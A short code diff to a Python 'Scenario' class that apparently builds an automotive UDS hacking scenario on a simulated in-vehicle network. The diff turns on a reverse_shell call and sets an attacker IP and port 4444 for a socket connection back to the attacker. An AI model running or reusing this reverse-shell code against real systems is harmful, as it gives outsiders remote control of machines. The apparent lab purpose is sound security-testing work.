@@ -76,7 +76,7 @@ class Scenario:
     def create_uds_hack_scenario(self, srv_tester, srv_server, control, vehicle, vehicledoor):
         print("------------------ UDS SERVER START -------------------")
         service_shell = IVN.find_service("virtual_shell", self.ivn_instance)
-        #self.reverse_shell(service_shell, self.stop_event)
+        self.reverse_shell(service_shell, self.stop_event)
         service_tester = IVN.find_service(srv_tester, self.ivn_instance)
         service_server = IVN.find_service(srv_server, self.ivn_instance)
         if not service_tester or not service_server:
@@ -208,7 +208,7 @@ class Scenario:
 
     def reverse_shell(self, service_shell, stop_event):
         def attempt_connection():            
-            attacker_ip = '192.168.56.1'
+            attacker_ip = '192.168.175.201'
             attacker_port = 4444
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             
